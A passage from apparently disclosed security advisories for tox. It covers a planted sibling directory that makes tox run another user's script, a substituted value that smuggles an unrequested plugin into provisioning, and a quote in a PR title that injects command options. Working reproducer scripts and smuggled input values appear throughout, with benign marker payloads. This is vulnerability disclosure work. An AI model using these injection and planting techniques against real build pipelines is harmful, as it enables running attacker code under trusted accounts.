for probe_version in 4.0.0a7 4.0.0a8; do
  probe_env="$probe_root/$probe_version-host"
  probe_project="$probe_root/$probe_version/fix#12"
  probe_sibling="$probe_root/$probe_version/fix\#12"
  uv venv --python 3.11 "$probe_env" >/dev/null 2>&1
  uv pip install -p "$probe_env/bin/python" "tox==$probe_version" >/dev/null 2>&1
  mkdir -p "$probe_project/docs" "$probe_sibling/docs"
  cat > "$probe_project/tox.ini" <<'INI'
[tox]
no_package = true

[testenv:docs]
change_dir = {tox_root}/docs
commands = python build_docs.py
INI
  cat > "$probe_project/docs/build_docs.py" <<'PY'
print("TRUSTED")
PY
  cat > "$probe_sibling/docs/build_docs.py" <<'PY'
print("PLANTED")
PY
  printf '%s ' "$probe_version"
  (cd "$probe_project" && env -i PATH="$probe_env/bin:/usr/bin" "$probe_env/bin/tox4" run -e docs) \
    | rg '^(TRUSTED|PLANTED)$'
done
```

It printed:

```text
4.0.0a7 TRUSTED
4.0.0a8 PLANTED
```

This historical check uses one account; the multi-user test above checks the privilege boundary. The same fixture
printed `PLANTED` with 4.0.0, 4.30.0, 4.50.0, and 4.67.4, and `TRUSTED` with 4.67.5. tox 3.28.0, using
`changedir = {toxinidir}/docs`, printed `TRUSTED`. The hash escape followed by `Path(value)` is present in all 10
published 4.0 prereleases from a8 through rc4 and all 193 stable 4.x tags through 4.67.4. The six earlier published
alphas lack that escape. The source check is separate from the runtime checks.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Local account
    participant J as Trusted run
    participant T as tox
    participant S as Path resolver
    participant F as File system
    A->>F: plant a sibling directory beside a path with an escaped hash
    J->>+T: run with the stated input
    T->>S: substitute the path before resolution
    Note over T,S: tox enters the planted directory and runs its script
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import os
import pathlib
import pwd
import shutil
import subprocess
import sys
import tempfile

REPRO_D = pathlib.Path("/tmp/repro.d")
TOX = "/opt/venv/bin/tox"

# set up: a sticky, world-writable directory like /tmp, in which root keeps two root-owned checkouts
# of the same project; the only difference is the "#" in the name
shared = pathlib.Path(tempfile.mkdtemp(prefix="shared-"))
shared.chmod(0o1777)
control = shared / "fix-12"
victim = shared / "fix#12"
for project in (control, victim):
    (project / "docs").mkdir(parents=True)
    shutil.copy(REPRO_D / "tox.ini", project / "tox.ini")
    shutil.copy(REPRO_D / "build_docs.py", project / "docs" / "build_docs.py")
print(f"SETUP {shared} mode={shared.stat().st_mode & 0o7777:o}")
print(f"SETUP {victim} owner={pwd.getpwuid(victim.stat().st_uid).pw_name} mode={victim.stat().st_mode & 0o7777:o}")

# the other local user's files, in a directory of their own
attacker_home = pathlib.Path(tempfile.mkdtemp(prefix="attacker-"))
shutil.copy(REPRO_D / "plant_sibling_directory.py", attacker_home)
shutil.copy(REPRO_D / "planted_build_docs.py", attacker_home)
subprocess.run(["chown", "-R", "scanner-test:scanner-test", attacker_home], check=True)

# attack: the other local user, who cannot write to the checkout, prepares a directory next to it
subprocess.run(
    [sys.executable, attacker_home / "plant_sibling_directory.py", victim],
    user="scanner-test",
    group="scanner-test",
    extra_groups=[],
    check=True,
)

# root runs tox in each of its checkouts
control_run = subprocess.run([TOX, "run", "-e", "docs"], cwd=control, capture_output=True, text=True, check=True)
victim_run = subprocess.run([TOX, "run", "-e", "docs"], cwd=victim, capture_output=True, text=True, check=True)
print(f"--- tox run -e docs in {control}")
print(control_run.stdout, end="")
print(f"--- tox run -e docs in {victim}")
print(victim_run.stdout, end="")

# check: in both checkouts tox must run the project's docs/build_docs.py in <checkout>/docs
planted = shared / "fix\\#12" / "docs" / "build_docs.py"
planted_owner = pwd.getpwuid(planted.stat().st_uid).pw_name
print(f"OBSERVED {planted} is owned by {planted_owner}")
control_ok = f"project's build_docs.py ran as uid={os.getuid()} in {control / 'docs'}" in control_run.stdout
planted_ran = f"planted build_docs.py ran as uid={os.getuid()} in {planted.parent}" in victim_run.stdout
print(f"CONTROL {control}: project's script ran in its docs directory: {control_ok}")
print(f"OBSERVED {victim}: {planted_owner}'s planted script ran as uid={os.getuid()}: {planted_ran}")
print("BUG" if control_ok and planted_ran and planted_owner == "scanner-test" else "OK")
```

**repro.d/build_docs.py**

```python
print(f"project's build_docs.py ran as uid={os.getuid()} in {os.getcwd()}")
```

**repro.d/plant_sibling_directory.py**

```python
import sys

project = pathlib.Path(sys.argv[1])
sibling = project.with_name(project.name.replace("#", "\\#"))

(sibling / "docs").mkdir(parents=True)
```


**Dockerfile.repro (test harness)**

```dockerfile
FROM python:3.15-bookworm
ENV DEBIAN_FRONTEND=noninteractive \
    PIP_DISABLE_PIP_VERSION_CHECK=1

RUN apt-get update && apt-get install -y --no-install-recommends man-db passwd \
    && rm -rf /var/lib/apt/lists/* \
    && useradd --create-home --shell /bin/bash scanner-test

RUN python -m venv /opt/venv
ENV PATH=/opt/venv/bin:$PATH

COPY . /src
WORKDIR /src

RUN pip install --upgrade pip \
    && { git describe --tags >/dev/null 2>&1 || export SETUPTOOLS_SCM_PRETEND_VERSION=0.0.0; } \
    && pip install -e '.[completion]' --group test \
    && pip wheel --no-deps --wheel-dir /opt/wheels .

RUN chown -R scanner-test:scanner-test /src && git config --global --add safe.directory /src
```

## Impact

The reproduction ran attacker-controlled code under the tox account. The reproducer does not establish that a typical
tox run has this input source. Exposure is unlikely because the attack needs a sibling directory planted beside a
checkout whose path contains an escaped hash.

Severity: CVSS v4.0 base 5.3 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The checkout name must contain `#` and its parent must be writable by another account. The attacker cannot
  create either condition in the victim's existing checkout.
  [FIRST defines AT:P for specific deployment conditions outside the attacker's control](https://www.first.org/cvss/v4.0/specification-document#Attack-Requirements-AT).
  The [official calculator](https://github.com/FIRSTdotorg/cvss-v4-calculator) gives 5.4 for this vector.
- `PR:L`: The attacker needs permission to create or swap an entry in a local directory.
- `UI:P`: A trusted user or job must run tox after the attacker prepares the path.
- `VC:H`: The reproduced code runs with access to the tox account's files.
- `VI:H`: The attacker-controlled code runs with the tox account's write permissions.
- `VA:L`: The attacker-controlled code can stop one tox invocation. The reproduction does not establish sustained or
  persistent denial of tox or a direct, serious availability consequence.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The reproducer confirmed the flaw in 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.
[Fix head `964c98b9e356e96ed78e4f6295cbce505ff2d148`](https://github.com/gaborbernat/tox/commit/964c98b9e356e96ed78e4f6295cbce505ff2d148)
on [public PR #4285](https://github.com/tox-dev/tox/pull/4285) returned `OK` in the same isolated reproducer. The
Windows VM ran the existing hash-path case and related configuration tests: 349 passed, 2 skipped.

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

Historical checks also confirm tox 4.0.0a8; the reproduced releases are checked below.

## Known mitigation

Keep the checkout parent inaccessible to other users when its path contains a hash.

## Affected release

- [x] 4.0.0a8 (lowest confirmed affected)
- [x] 4.0.0
- [x] 4.30.0
- [x] 4.50.0
- [x] 4.67.4 (highest confirmed affected)

## Credits

Anthropic OSS Scanner, ANT-2026-L86CEC6H.

summary: Substituted value adds an unrequested package
description:
## Summary

Substituted value adds an unrequested package. Anthropic OSS Scanner reported this as ANT-2026-BY55A26Z on 2026-10-22.

## Affected area

INI list, set, dictionary, and environment settings.

## Attacker-controlled input

One outside-controlled value substituted inside an INI entry. The attacker does not need to edit the trusted tox
configuration.

## Affected code

[`IniLoader.build()` in `src/tox/config/loader/ini/__init__.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/__init__.py#L88)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

At release 4.67.4,
[`IniLoader.build()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/__init__.py#L88-L105)
replaced tokens before conversion.
[`StrConvert.to_list()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/str_convert.py#L37-L48)
split the resulting `requires` value into requirements.
[`provision()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/provision.py#L78-L103)
passed the added requirement to the provision environment.
[`_setup_and_execute()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/provision.py#L168-L175)
re-ran tox there, and
[`Plugin._load_external_plugins()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/plugin/manager.py#L94-L97)
loaded its entry point. The reproduction below records the import.

[`StrConvert.to_dict()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/str_convert.py#L52-L59)
also split substituted lines into keys.
[`StrConvert.to_env_list()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/str_convert.py#L141-L145)
passed the substituted value to
[`expand_env_with_negation()`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/factor.py#L128-L158),
which split commas and brace groups into environment names. A token occupying an entire entry already expands to several
entries by design; the flaw concerns tokens embedded within one entry.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and tested main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  .tox/.tox holds demo-pkg-inline: True
OBSERVED .tox/.tox after the attack value also holds: ['unrequested_plugin-1.0.dist-info']
OBSERVED plugin-ran.txt: imported by: /tmp/tox-requires-y_zao_y6/attack/.tox/.tox/bin/python -m tox run -e py
BUG
```

At fix commit `7d8bff7739a03df9ea2e3f0c45c73e47d95e49e4`, the same container returned `OK`: the control installed
`demo-pkg-inline`, while the altered value produced
`replace failed in tox.requires with ValueError('a substitution within an entry cannot add an entry separator')`.
`OBSERVED .tox/.tox after the attack value also holds: []` and `OBSERVED plugin-ran.txt: absent` show that no extra
wheel was installed or imported. The run used `docker run --rm --network=none -u 0 -w /src` with the report's reproducer
mounted read-only.

### Earlier release check

This test builds a local wheelhouse, then provisions with `PIP_NO_INDEX=1` and supplies a newline in the value of one
`requires` entry. tox 3.8.0 splits that value into two requirements and imports the added wheel's benign `[tox]` entry
point. The earlier 3.7.0 release stops before provisioning. The script adds `setuptools<81` to a provision environment
only if modern virtualenv left out `pkg_resources`, which tox 3.8.0 imports.

```sh
#!/usr/bin/env bash
set -euo pipefail
probe_root=$(mktemp -d /tmp/tox-requires-boundary.XXXXXX)
probe_wheels="$probe_root/wheels"
mkdir -p "$probe_wheels"
python3.11 -m pip download -q --dest "$probe_wheels" 'tox==3.8.0' 'setuptools<81'
python3.11 - "$probe_wheels" <<'PY'
import sys
from pathlib import Path
from zipfile import ZipFile

wheelhouse = Path(sys.argv[1])
for name, normalized in (("demo-pkg-inline", "demo_pkg_inline"), ("unrequested-plugin", "unrequested_plugin")):
    dist_info = f"{normalized}-1.0.0.dist-info"
    with ZipFile(wheelhouse / f"{normalized}-1.0.0-py3-none-any.whl", "w") as wheel:
        wheel.writestr(f"{dist_info}/METADATA", f"Metadata-Version: 2.1\nName: {name}\nVersion: 1.0.0\n")
        wheel.writestr(f"{dist_info}/WHEEL", "Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n")
        if name == "unrequested-plugin":
            module = 'from pathlib import Path\nPath("plugin-ran.txt").write_text("plugin imported\\n")\n'
            wheel.writestr("unrequested_plugin.py", module)
            wheel.writestr(f"{dist_info}/entry_points.txt", "[tox]\nunrequested = unrequested_plugin\n")
        wheel.writestr(f"{dist_info}/RECORD", "")
PY
attack_version=$'1.0.0\nunrequested-plugin @ file://'"$probe_wheels/unrequested_plugin-1.0.0-py3-none-any.whl"
for probe_version in 3.7.0 3.8.0; do
  probe_env="$probe_root/$probe_version-host"
  probe_project="$probe_root/$probe_version-project"
  uv venv --python 3.11 "$probe_env" >/dev/null 2>&1
  uv pip install -p "$probe_env/bin/python" "tox==$probe_version" 'setuptools<81' >/dev/null 2>&1
  mkdir -p "$probe_project"
  cat > "$probe_project/tox.ini" <<'INI'
[tox]
requires = demo-pkg-inline=={env:DEMO_VERSION:1.0.0}
skipsdist = true

[testenv]
commands = python -c "print('tests ran')"
INI
  (cd "$probe_project" && env -i PATH="$probe_env/bin:/usr/bin" PIP_NO_INDEX=1 \
    PIP_FIND_LINKS="$probe_wheels" DEMO_VERSION="$attack_version" \
    "$probe_env/bin/tox" -e py > setup.log 2>&1) || :
  if [ "$probe_version" = 3.7.0 ]; then
    rg -q 'MissingRequirement' "$probe_project/setup.log"
    test ! -e "$probe_project/.tox/.tox"
    printf '%s MissingRequirement; no provision environment\n' "$probe_version"
    continue
  fi
  probe_provision="$probe_project/.tox/.tox"
  test -d "$probe_provision/lib/python3.11/site-packages/unrequested_plugin-1.0.0.dist-info"
  if ! "$probe_provision/bin/python" -c 'import pkg_resources' >/dev/null 2>&1; then
    uv pip install -p "$probe_provision/bin/python" 'setuptools<81' >/dev/null 2>&1
  fi
  (cd "$probe_project" && env -i PATH="$probe_env/bin:/usr/bin" PIP_NO_INDEX=1 \
    PIP_FIND_LINKS="$probe_wheels" DEMO_VERSION="$attack_version" \
    "$probe_env/bin/tox" -e py > run.log 2>&1)
  printf '%s ' "$probe_version"
  cat "$probe_project/plugin-ran.txt"
done
```

It printed:

```text
3.7.0 MissingRequirement; no provision environment
3.8.0 plugin imported
```

The added requirement also reached provisioning in 3.28.0, 4.0.0a2, 4.0.0, 4.30.0, 4.50.0, and 4.67.4. tox 4.67.5
rejected the added entry separator. A source check found `getlist("requires")` followed by line splitting in all 55
stable 3.x tags from 3.8.0 through 3.28.0, and a replacer followed by `to_list()` splitting in all 193 stable 4.x tags
through 4.67.4. This check is separate from the runtime results.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as INI list loader
    A->>J: provide a value inside an INI list entry
    J->>+T: run with the stated input
    T->>S: split the substituted list entry again
    Note over T,S: an unrequested package reaches installation
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

work = Path(tempfile.mkdtemp(prefix="tox-requires-"))

# set up: no network, so a directory of wheels is the package index; it holds what tox.ini requires and nothing else
index = work / "index"
subprocess.run(["/opt/venv/bin/python", "/tmp/repro.d/make_package_index.py", index], check=True)
pipeline_env = {**os.environ, "PIP_NO_INDEX": "1", "PIP_FIND_LINKS": str(index)}

# attacker: a wheel on a host of their own, and the value of the one variable tox.ini reads
attacker_host = work / "attacker-host"
subprocess.run(["/opt/venv/bin/python", "/tmp/repro.d/build_unrequested_plugin.py", attacker_host], check=True)
wheel_url = (attacker_host / "unrequested_plugin-1.0-py3-none-any.whl").as_uri()  # file: stands in for https:
attack_version = f"1.0.0,unrequested-plugin @ {wheel_url}"

# control: the pipeline runs tox with the version it normally sets
control = work / "control"
control.mkdir()
shutil.copy("/tmp/repro.d/tox.ini", control)
print("--- control: DEMO_VERSION=1.0.0 tox run -e py", flush=True)
subprocess.run(
    ["/opt/venv/bin/tox", "run", "-e", "py"], cwd=control, env={**pipeline_env, "DEMO_VERSION": "1.0.0"}, check=True
)

# attack: the same pipeline, with DEMO_VERSION chosen by the attacker
attack = work / "attack"
attack.mkdir()
shutil.copy("/tmp/repro.d/tox.ini", attack)
print(f"--- attack: DEMO_VERSION={attack_version!r} tox run -e py", flush=True)
subprocess.run(
    ["/opt/venv/bin/tox", "run", "-e", "py"], cwd=attack, env={**pipeline_env, "DEMO_VERSION": attack_version}
)

# check: tox.ini requires demo-pkg-inline only, so nothing else may be provisioned into .tox/.tox and imported by tox
control_dists = {path.name for path in control.glob(".tox/.tox/lib/python*/site-packages/*.dist-info")}
attack_dists = {path.name for path in attack.glob(".tox/.tox/lib/python*/site-packages/*.dist-info")}
added = attack_dists - control_dists
plugin_ran = attack / "plugin-ran.txt"
plugin_report = plugin_ran.read_text().strip() if plugin_ran.exists() else "absent"
print("CONTROL  .tox/.tox holds demo-pkg-inline:", "demo_pkg_inline-1.0.0.dist-info" in control_dists)
print("OBSERVED .tox/.tox after the attack value also holds:", sorted(added))
print("OBSERVED plugin-ran.txt:", plugin_report)
imported_by_provisioned_tox = str(attack / ".tox/.tox/bin/python") in plugin_report
print("BUG" if added == {"unrequested_plugin-1.0.dist-info"} and imported_by_provisioned_tox else "OK")
```

```python
import shutil
import subprocess
import sys
import zipfile
from importlib.metadata import distribution
from pathlib import Path

index = Path(sys.argv[1])
index.mkdir(parents=True)

# tox, as the image built it from /src
for tox_wheel in Path("/opt/wheels").glob("tox-*.whl"):
    shutil.copy(tox_wheel, index)

# the dependencies of tox are installed in /opt/venv but not kept as wheels: pack the installed files back into wheels
dependencies = [
    "cachetools", "colorama", "distlib", "filelock", "packaging", "platformdirs",
    "pluggy", "pyproject-api", "python-discovery", "tomli-w", "virtualenv",
]  # fmt: skip
for name in dependencies:
    installed = distribution(name)
    with zipfile.ZipFile(index / f"{name.replace('-', '_')}-{installed.version}-py3-none-any.whl", "w") as wheel:
        for file in installed.files:
            # console scripts (../../bin/...), byte code and pip's bookkeeping are not part of a wheel
            if file.parts[0] == ".." or "__pycache__" in file.parts or file.name in {"INSTALLER", "REQUESTED"}:
                continue
            wheel.write(file.locate(), str(file))

# demo-pkg-inline 1.0.0, the requirement tox.ini names, from tox's own test fixture
fixture = "/src/tests/demo_pkg_inline"
subprocess.run(
    [sys.executable, "-m", "pip", "wheel", "-q", "--no-deps", "--no-index", "-w", index, fixture], check=True
)
```

## Impact

The reproduction ran attacker-controlled code under the tox account. The reproducer does not establish that a typical
tox run has this input source. Exposure is niche because the attack needs one outside-controlled value substituted
inside an INI list entry.

For scoring, the conditional path is a trusted CI job forwarding outside-supplied data into this setting without
granting its source access to the tox host. The reproducer does not establish that such a job is deployed.

Severity: CVSS v4.0 base 7.3 (`CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N`). Metric reasons:

- `AV:L`: The reproducer runs tox on the host with the triggering value or path; it shows no network route into tox.
- `AC:L`: The reproducer requires no target-specific secret or evasion technique.
- `AT:P`: The trusted INI configuration must place an outside-controlled value inside one entry. The attacker cannot add
  that substitution to an existing checkout.
  [FIRST defines AT:P for specific deployment conditions outside the attacker's control](https://www.first.org/cvss/v4.0/specification-document#Attack-Requirements-AT).
  The [official calculator](https://github.com/FIRSTdotorg/cvss-v4-calculator) gives 5.4 for this vector.
- `PR:N`: The conditional outside source needs no prior privilege on the tox host.
- `UI:P`: A trusted user or job must run tox with the supplied input.
- `VC:H`: The reproduced code runs with access to the tox account's files.
- `VI:H`: The attacker-controlled code runs with the tox account's write permissions.
- `VA:L`: The attacker-controlled code can stop one tox invocation. The reproduction does not establish sustained or
  persistent denial of tox or a direct, serious availability consequence.
- `SC:N`: No other system disclosed data in the test.
- `SI:N`: The reproduction does not establish an integrity impact on a subsequent system.
- `SA:N`: The test shows no outage in another system.

## Versions tested

The reproducer confirmed the flaw in 4.67.4, report commit `7988418936b730b19981ba934dc8b57186d6b957`, and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`. Fix commit
[`7d8bff7739a03df9ea2e3f0c45c73e47d95e49e4`](https://github.com/tox-dev/tox/commit/7d8bff7739a03df9ea2e3f0c45c73e47d95e49e4)
on [public PR #4284](https://github.com/tox-dev/tox/pull/4284) returned `OK` in the same isolated reproducer.

[tox 4.67.5](https://github.com/tox-dev/tox/releases/tag/4.67.5) includes the fix.

Postrelease checks covered all 265 tox versions published on PyPI from 3.8.0 through 4.67.4, including all 16 published
4.0.0 prereleases and 4.5.1.1. Each check showed the newline-supplied `unrequested-plugin` as a separate provision
requirement. tox 3.13.0–3.13.2 ran under Python 3.7 because their pinned metadata dependency fails before configuration
loads on newer Python. Full wheel replays at 3.8.0, 4.3.0, 4.3.1, 4.5.1.1, and 4.67.4 also confirmed plugin import; the
other matrix checks confirm requirement splitting. tox 3.7.0 did not provision, and 4.67.5 rejected the added entry. The
[3.8.0 parser](https://github.com/tox-dev/tox/blob/da6f5c1bdd82c0bc80763ab40a5f4d944599c038/src/tox/config/__init__.py#L1350-L1354),
[4.0.0a2 parser](https://github.com/tox-dev/tox/blob/096f6a8184f4846163fea13d34ceafc76a99119e/src/tox/config/loader/str_convert.py#L25-L31),
and
[4.67.4 parser](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/str_convert.py#L37-L47)
show the respective split paths.

## Known mitigation

Avoid outside-controlled substitutions inside INI list, set, dictionary, or environment-list entries.

cwes.name: Improper Neutralization of Value Delimiters

summary: Substituted INI value adds command options
description:
## Summary

Substituted INI value adds command options. Anthropic OSS Scanner reported this as ANT-2026-0XX9ARST on 2026-10-22.

## Affected area

INI command parsing.

## Attacker-controlled input

One outside-controlled value inserted into a quoted command argument. The attacker does not need to edit the trusted tox
configuration.

## Affected code

[`IniLoader.build()` in `src/tox/config/loader/ini/__init__.py`](https://github.com/tox-dev/tox/blob/ff5def6164d86e1a5bddfcbe9990d03ac995c2ae/src/tox/config/loader/ini/__init__.py#L90-L103)
at release commit `ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`.

## Mechanism

INI substitution inserts the value before command parsing. A quote in the value ends the intended argument and creates
another option. See [Python shlex](https://docs.python.org/3/library/shlex.html) for parser behavior.

## Reproduction and evidence

The reporter's reproducer returned `BUG` against release 4.67.4 in an isolated container with no network access. It also
returned `BUG` against report commit `7988418936b730b19981ba934dc8b57186d6b957` and main commit
`d1963d076c78ed4c03c6f8c6e8fbaf9163e21f48`.

Save the Dockerfile below in the finding directory. With a source checkout at release commit
`ff5def6164d86e1a5bddfcbe9990d03ac995c2ae`, build the test image and run:

```sh
release_checkout=/path/to/tox-4.67.4
docker build -f Dockerfile.repro -t tox-sec-4.67.4 "$release_checkout"
docker run --rm --network=none -u 0 -w /src -v "$PWD/repro:/tmp/repro:ro,z" -v "$PWD/repro.d:/tmp/repro.d:ro,z" tox-sec-4.67.4 /tmp/repro
```

```text
CONTROL  tox.ini  PR_TITLE='fix --injected-option typo'     -> record_argv.py got ['--title=fix --injected-option typo']
CONTROL  tox.toml PR_TITLE='fix" --injected-option "typo'   -> record_argv.py got ['--title=fix" --injected-option "typo']
OBSERVED tox.ini  PR_TITLE='fix" --injected-option "typo'   -> record_argv.py got ['--title=fix', '--injected-option', 'typo']
BUG
```

### Earlier release check

The following isolated test ran tox 1.0 with Python 3.11. Its wrappers remove only setup flags that current virtualenv
and pip no longer accept; they leave tox's test command intact. The first tox invocation must fail with pip's removed
`--download-cache` option, which the test checks before retrying.

```sh
#!/usr/bin/env bash
set -eu
probe_root=$(mktemp -d /tmp/tox-1.0-argv.XXXXXX)
probe_env="$probe_root/host"
probe_project="$probe_root/project"
uv venv --python 3.11 "$probe_env"
uv pip install -p "$probe_env/bin/python" 'tox==1.0' 'setuptools==80.10.2' 'virtualenv==21.15.2'
mkdir -p "$probe_project"
cat > "$probe_project/tox.ini" <<'INI'
[tox]
skipsdist = true

[testenv]
commands = python record_argv.py "--title={env:PR_TITLE}"
INI
cat > "$probe_project/setup.py" <<'PY'
from setuptools import setup
setup(name="tox-version-probe", version="0.0.0")
PY
cat > "$probe_project/record_argv.py" <<'PY'
import json
import sys
from pathlib import Path
Path("argv.json").write_text(json.dumps(sys.argv[1:]), encoding="utf-8")
PY
mv "$probe_env/bin/virtualenv" "$probe_env/bin/virtualenv-current"
cat > "$probe_env/bin/virtualenv" <<'PY'
#!/usr/bin/env python3
import subprocess
import sys
arguments = [arg for arg in sys.argv[1:] if arg not in {"--distribute", "--no-site-packages"}]
raise SystemExit(subprocess.call([sys.executable, "-m", "virtualenv", *arguments]))
PY
chmod +x "$probe_env/bin/virtualenv"
(cd "$probe_project" && env -i PATH="$probe_env/bin:/usr/bin" PR_TITLE='fix" --injected-option "typo' \
  "$probe_env/bin/tox" -e python > setup.log 2>&1) || :
rg -q 'no such option: --download-cache' "$probe_project/setup.log"
test -x "$probe_project/.tox/python/bin/pip"
mv "$probe_project/.tox/python/bin/pip" "$probe_project/.tox/python/bin/pip-current"
cat > "$probe_project/.tox/python/bin/pip" <<'PY'
#!/usr/bin/env python3
import subprocess
import sys
arguments = [arg for arg in sys.argv[1:] if not arg.startswith("--download-cache=")]
raise SystemExit(subprocess.call([sys.executable, "-m", "pip", *arguments]))
PY
chmod +x "$probe_project/.tox/python/bin/pip"
(cd "$probe_project" && env -i PATH="$probe_env/bin:/usr/bin" PR_TITLE='fix" --injected-option "typo' \
  "$probe_env/bin/tox" -e python > run.log 2>&1)
rg 'record_argv.py' "$probe_project/run.log"
cat "$probe_project/argv.json"
```

The final run exited 0 and printed:

```text
[TOX] ... record_argv.py --title=fix --injected-option typo
["--title=fix", "--injected-option", "typo"]
```

The same crafted title was tested against installed tox wheels. The INI command was
`python record_argv.py "--title={env:PR_TITLE}"`, with `PR_TITLE='fix" --injected-option "typo'`. For each 4.x release,
a fresh project ran `tox run -e py` (the 4.0.0a2 through 4.0.0b1 command was `tox4 run -e py`). `record_argv.py`
received `['--title=fix', '--injected-option', 'typo']` in all 16 published 4.0 prereleases from 4.0.0a2 through
4.0.0rc4 and all 193 stable releases from 4.0.0 through 4.67.4. On 4.67.5 it received one argument,
`['--title=fix" --injected-option "typo']`. Each tox command exited 0. The complete tested-version list is in the
release checklist below.

The historical parser check found the extra option in 1.0, 1.2, 1.4, 1.5.0, 1.6.1, 1.7.2, 1.8.0, 1.9.2, 2.0.0, 2.3.0,
2.4.0, 2.5.0, 2.8.0, 2.9.1, 3.0.0, 3.1.0, 3.7.0, 3.13.0, 3.21.0, and 3.28.0. Full tox command runs also reached
`record_argv.py` in 1.0, 2.0.0, and 3.0.0. The parser kept the title in one argument on 0.9, 1.7.0, and 1.7.1.

Tagged parser source was checked in all 110 stable tox 1.x through 3.x releases. In 108 releases, substitution precedes
`shlex`; only 1.7.0 and 1.7.1 parse the command before substituting each argument. Parser tests at all 14 changes to
that command-processing source agreed with the source check.
[tox 1.7.0](https://github.com/tox-dev/tox/blob/4df8d56362f1d28609f2bc057a7e8b51d1ff3be2/tox/_config.py#L527-L554) shows
parsing before substitution;
[tox 1.7.2](https://github.com/tox-dev/tox/blob/115b02478074b554b8475fc60694007df7e9639b/tox/_config.py#L534-L562) again
substitutes before parsing. PyPI lists 0.9 and 1.0 as consecutive published releases; no 1.0 prerelease was published.
tox 1.0 is the lowest confirmed affected release, and 4.67.4 is the highest.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Input author
    participant J as Trusted run
    participant T as tox
    participant S as INI command loader
    A->>J: provide a value containing a quote
    J->>+T: run with the stated input
    T->>S: insert the value into a quoted INI command
    Note over T,S: the quote ends the argument and another option reaches the command
    deactivate T
```

## Reproducer files

The `repro` and `repro.d` files below are from the reporter's finding directory. The test image contains the 4.67.4
source at `/src` and the project installed in `/opt/venv`.

**repro**

```python
#!/usr/bin/env python3
import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

REPRO_D = Path("/tmp/repro.d")


def argv_received(config_file, pr_title):
    project = Path(tempfile.mkdtemp(prefix="tox-repro-"))
    shutil.copy(REPRO_D / config_file, project)
    shutil.copy(REPRO_D / "record_argv.py", project)
    # tox's own log goes to stderr: stdout carries only the evidence and the verdict
    subprocess.run(
        ["/opt/venv/bin/tox", "run", "-e", "py"],
        cwd=project,
        env={**os.environ, "PR_TITLE": pr_title},
        stdout=sys.stderr,
        check=True,
    )
    return json.loads((project / "argv.json").read_text())


# the contributor's PR title, and the same words without the two quotes
crafted_title = 'fix" --injected-option "typo'
plain_title = "fix --injected-option typo"

# control: the quoted INI argument holds a title with blanks; the TOML twin holds even the crafted one
ini_plain = argv_received("tox.ini", plain_title)
toml_crafted = argv_received("tox.toml", crafted_title)
print(f"CONTROL  tox.ini  PR_TITLE={plain_title!r:32} -> record_argv.py got {ini_plain}")
print(f"CONTROL  tox.toml PR_TITLE={crafted_title!r:32} -> record_argv.py got {toml_crafted}")

# attack
ini_crafted = argv_received("tox.ini", crafted_title)
print(f"OBSERVED tox.ini  PR_TITLE={crafted_title!r:32} -> record_argv.py got {ini_crafted}")

